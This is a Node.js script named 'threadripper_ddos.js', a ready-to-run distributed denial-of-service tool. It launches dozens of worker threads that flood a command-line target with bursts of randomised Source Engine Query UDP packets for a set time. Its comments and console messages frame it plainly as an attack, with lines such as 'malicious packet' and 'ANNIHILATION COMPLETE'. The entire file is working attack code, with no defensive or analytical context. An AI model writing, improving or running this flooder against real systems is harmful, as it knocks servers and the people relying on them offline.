// threadripper_ddos.js - FINAL FORM: 30-SECOND OBLIVION
import dgram from "dgram";
import { Worker, isMainThread, parentPort, workerData } from "node:worker_threads";
import crypto from "crypto";

const HEADER = Buffer.from([0xff, 0xff, 0xff, 0xff, 0x54]);
const BODY = Buffer.from("Source Engine Query\0", "binary");
const BASE = Buffer.concat([HEADER, BODY]);

// Generate high-entropy malicious packet
function genPacket() {
  const noise = crypto.randomBytes(8 + Math.floor(Math.random() * 32));
  const chal = crypto.randomBytes(4);
  return Buffer.concat([BASE, noise, chal]);
}

// ==================== WORKER: FLOOD CORE ====================
if (!isMainThread) {
  const { host, port, interval, burst, id } = workerData;
  let running = true;
  const sockets = [];

  // Create 2 sockets per worker for max throughput
  for (let i = 0; i < 2; i++) {
    const sock = dgram.createSocket("udp4");
    sock.on("error", () => {});
    sockets.push(sock);
  }

  let pktIdx = 0;
  function flood() {
    if (!running) return;
    for (let s = 0; s < sockets.length; s++) {
      const sock = sockets[s];
      for (let i = 0; i < burst; i++) {
        const pkt = genPacket();
        sock.send(pkt, 0, pkt.length, port, host);
        pktIdx++;
      }
    }
    // Stealth pulse (0.5% chance)
    if (Math.random() < 0.005) {
      parentPort.postMessage({ id, pps: pktIdx / (Date.now() - startTime) * 1000 });
    }
  }

  const startTime = Date.now();
  const iv = setInterval(flood, interval);
  parentPort.postMessage({ id, ready: true });

  parentPort.on("message", (m) => {
    if (m === "stop") {
      clearInterval(iv);
      running = false;
      sockets.forEach(s => s.close());
      process.exit(0);
    }
  });
}

// ==================== MAIN: SWARM COMMANDER ====================
if (isMainThread) {
  const [,, target, threads = 50, interval = 1, timeout = 100, runtime = 30000, burst = 500] = process.argv;
  const [HOST, PORT_STR] = target.split(":");
  const PORT = Number(PORT_STR);

  console.log(`\n🌀 THREADRIPPER DDOS SWARM – FINAL FORM 🌀`);
  console.log(`Target: ${HOST}:${PORT}`);
  console.log(`Swarm: ${threads} workers × ${burst} pkt/burst × 1000 Hz = ~${(threads * burst * 1000).toLocaleString()} PPS`);
  console.log(`Duration: ${runtime/1000}s | Interval: ${interval}ms | Timeout: ${timeout}ms\n`);

  const start = Date.now();
  const workers = [];

  for (let i = 0; i < threads; i++) {
    const w = new Worker(new URL(import.meta.url), {
      workerData: { host: HOST, port: PORT, interval, burst, id: i + 1 }
    });
    w.on("message", (msg) => {
      if (msg.ready) console.log(`[DEPLOY] Unit #${msg.id}`);
      if (msg.pps) console.log(`[PPS] Worker #${msg.id}: ~${msg.pps.toFixed(0)} PPS`);
    });
    workers.push(w);
  }

  const shutdown = () => {
    console.log(`\n🌀 ANNIHILATION COMPLETE 🌀`);
    workers.forEach(w => w.postMessage("stop"));
    setTimeout(() => process.exit(0), 500);
  };

  setTimeout(shutdown, runtime);
  process.on("SIGINT", shutdown);
}